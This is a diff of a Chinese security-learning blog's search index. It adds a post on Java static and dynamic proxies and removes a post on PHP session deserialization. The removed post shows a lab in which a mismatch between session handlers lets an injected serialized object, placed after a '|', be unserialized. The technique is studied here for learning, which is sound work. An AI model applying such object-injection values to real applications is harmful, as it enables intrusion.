@@ -319,11 +319,88 @@
       </categories>
   </entry>
   <entry>
+    <title>Java动态代理</title>
+    <url>/2024/06/16/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>利用了代理模式，一个通俗易懂的说法：给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。</p>
+<span id="more"></span>
+
+<h2 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h2><p>代理模式是Java中常见的设计模式。</p>
+<p>其特征是代理类和委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把信息转发给委托类，以及事后处理消息等。</p>
+<p>代理类与委托类之间通常会存在关联关系，一个代理类对象与一个委托类对象关联，代理类对象本身并不真正实现服务，而是通过委托类对象的相关方法来提供特定服务。</p>
+<p><img src="/2024/06/16/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20240616202423103.png" alt="image-20240616202423103"></p>
+<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>需要代理对象和目标对象实现同样的接口。</p>
+<p><strong>缺点：</strong>当需要的代理的对象过多就需要实现大量的代理类，并且当接口增加方法，目标对象与代理对象都要进行修改</p>
+<p>直接用参考文章的一个demo来演示一下什么是静态代理，理解一下</p>
+<p>Event.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Text.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//委托类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;出租房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Main.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代理类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Event target;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">(Event target)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房子出租为1k-3k&quot;</span>);</span><br><span class="line">        target.sale();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终的测试类：Test.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">consumer</span><span class="params">(Event subject)</span>&#123;</span><br><span class="line">        subject.sale();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Event</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();<span class="comment">//创建一个Text类的实例，并将其赋值给一个Event类型的变量test。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;---使用代理之前---&quot;</span>);</span><br><span class="line">        consumer(test);</span><br><span class="line">        System.out.println(<span class="string">&quot;---使用代理之后---&quot;</span>);</span><br><span class="line">        consumer(<span class="keyword">new</span> <span class="title class_">Main</span>(test));<span class="comment">//这里的new Main()会先调用Main的构造函数，使得subject为Main()实例，并且Main中的target为Text()实例，所以会先调用Main()中的sale()，然后再调用Text()中的sale()，最后会生成如下结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---使用代理之前---</span><br><span class="line">出租房子</span><br><span class="line">---使用代理之后---</span><br><span class="line">房子出租为1k-3k</span><br><span class="line">出租房子</span><br></pre></td></tr></table></figure>
+
+<p>现在来想想为什么要这么用，</p>
+<p>我们这里都是用的接口类作为类型，并且构造函数的接收的参数类型也都是接口类型。</p>
+<p>然后再调用函数，先主要看看测试类的<code>consumer()</code>方法的参数以及内容，参数同样接受一个接口类型的参数，重点就在于方法内部的这个<code>subject.sale()</code>，这里决定了调用哪个对象的sale()方法。</p>
+<p>现在再看看代理类java文件的构造函数，也是用的接口类型作为参数的。</p>
+<p>大概想清楚了，对于代理在这个示例代码中就是注意是如何调用的<code>sale()</code>方法，只要我们可以更改前面的对象，就可以实现使用不同方法体的<code>sale()</code>函数。而这中间的媒介就是接口类型，只要使得最开始定义的对象的类型可以与后面逻辑相对应即可。</p>
+<p>那么为什么这里要使用Event接口类型作为媒介呢，应该是因为委托类接口了Event接口，这样就可以使得相应的Text()对象可以成为这个类型，同时代理类Main也接口了Event接口，所以Main类也可以接受Event类型的数据。</p>
+<p>还有一个重要的点就是代理类的一串代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房子出租为1k-3k&quot;</span>);</span><br><span class="line">        target.sale();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是因为这串代码导致的最终输出为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">房子出租为1k-3k</span><br><span class="line">出租房子</span><br></pre></td></tr></table></figure>
+
+<p>因为我们new后将target对应到了委托类的对象，此时就会调用Text.java中的sale()方法，所以其实一般代理类的重要代码都会调用两次。简单流程图如下</p>
+<p><img src="/2024/06/16/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20240616154738359-17185406908775.png" alt="image-20240616154738359"></p>
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>与静态代理相同，需要公共接口，委托类，代理类。<strong>区别就是动态代理是利用反射机制在运行时创建代理类</strong>。这里需要用到位于<code>Java.lang.reflect</code>下的<code>Proxy类</code>与<code>InvocationHandler接口</code>。</p>
+<ul>
+<li><strong><code>InvocationHandler接口</code>：负责提供调用代理的操作</strong></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>proxy</code>为代理类的实例对象，<code>method</code>表示调用的方法名，<code>args[]</code>为调用方法的参数数组</p>
+<p>这个接口定义了一个invoke()方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到<code>InvocationHandler.invoke()</code>方法进行调用</p>
+<ul>
+<li><strong><code>Proxy类</code>：负责动态构建代理类</strong></li>
+</ul>
+<p>提供了静态方法用于得到代理对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span><span class="keyword">throws</span> IllegalArgumentException&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续使用前面的那个例子，结合代码，我们这里需要获得类加载器，相对应的方法，直接给代码：</p>
+<p>委托类和接口不变，看其他的代码：</p>
+<p>Main.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态获取代理的代理类</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">(Object target)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重写invoke()方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房租2k-3k&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target,args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Test.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取委托类的实例对象</span></span><br><span class="line">        <span class="type">Text</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line">        <span class="comment">// 获取CLassLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> test.getClass().getClassLoader();</span><br><span class="line">        <span class="comment">// 获取所有接口</span></span><br><span class="line">        Class[] interfaces = test.getClass().getInterfaces();</span><br><span class="line">        <span class="comment">// 获取一个调用处理器</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>(test);</span><br><span class="line">        <span class="comment">// 创建代理对象</span></span><br><span class="line">        <span class="type">Event</span> <span class="variable">proxy</span> <span class="operator">=</span> (Event) Proxy.newProxyInstance(classLoader,interfaces,invocationHandler);</span><br><span class="line">        <span class="comment">// 调用代理对象的sale()方法</span></span><br><span class="line">        proxy.sale();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">房租2k-3k</span><br><span class="line">出租房子</span><br></pre></td></tr></table></figure>
+
+<p>可以自己调试一下跟一下过程，注意和静态代理那里对比一下，其实本质是差不多的。</p>
+<p>参考文章：</p>
+<p><code>https://xz.aliyun.com/t/9197?time__1311=n4%2BxuDgD9DyDnB7QGQD%2FD0WoQ4D55i%3D31YNGt4D</code></p>
+<p><code>https://www.cnblogs.com/whirly/p/10154887.html</code></p>
+]]></content>
+      <categories>
+        <category>Java安全</category>
+        <category>Java基础</category>
+        <category>Java动态代理</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Java反射机制</title>
     <url>/2024/06/15/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><p>Java反射（<code>Reflection</code>）是Java非常重要的动态特性<strong>，通过使用反射我们可以获取到任何类的成员方法（<code>Methods</code>）、成员变量（<code>Fields</code>）、构造方法（<code>Constructors</code>）等信息，还可以动态创建Java实例、调用任意的类方法、修改任意的类成员变量值等</strong>。</p>
-<p>Java反射机制是Java语言的动态性的重要体现。</p>
-<p><strong>使用反射的前提条件</strong>：必须先得到代表的字节码的Class，Class类用于表示.class文件（字节码）</p>
+<p>这是一个重要的机制，可以绕过java私有访问权限检查，反射获取并调用私有的类从而可以进行命令执行</p>
 <p>本文JDK测试版本为11,也有的文章说的是非public修饰符，而我测试出来只针对private修饰符，注意版本</p>
 <span id="more"></span>
 
@@ -1769,494 +1846,6 @@
       </categories>
   </entry>
   <entry>
-    <title>session反序列化学习</title>
-    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>好用，爱用，多用</p>
-<span id="more"></span>
-
-<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
-<p><strong>PHP session：</strong></p>
-<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
-<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
-<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
-<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
-<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
-<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>session.save_handler&#x3D;””</li>
-</ul>
-<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
-<ul>
-<li><strong>session.serialize_handler</strong></li>
-</ul>
-<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
-<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
-<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
-<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
-<p>并且文件的内容始终是session值的序列化之后的内容。</p>
-<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
-<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
-<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
-<ul>
-<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
-</li>
-<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
-</li>
-</ul>
-<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考文章1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
-<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>处理器名称</th>
-<th>存储格式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>php</td>
-<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
-</tr>
-<tr>
-<td>php_binary</td>
-<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
-</tr>
-<tr>
-<td>php_serialize</td>
-<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
-</tr>
-</tbody></table>
-<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
-<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
-<p>测试一下，demo如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
-<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
-<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
-<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
-<p>demo改为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
-<p>两张图片可以对比一下</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
-<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
-<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
-<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
-<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
-<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
-<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
-<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
-<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
-<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
-<p>flag.php：</p>
-<p>这个页面用于接受session的值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>1.php：</p>
-<p>这个页面用于测试反序</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>先访问1.php，输出</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
-<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
-<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
-<p>在电脑上看一看此时session的值：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里可以看到成功写入，这是再访问以下1.php</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
-<p>成功反序。</p>
-<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
-<ul>
-<li>两个文件session引擎配置不同</li>
-<li>其中一个session可控</li>
-<li>两个文件同域</li>
-</ul>
-<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
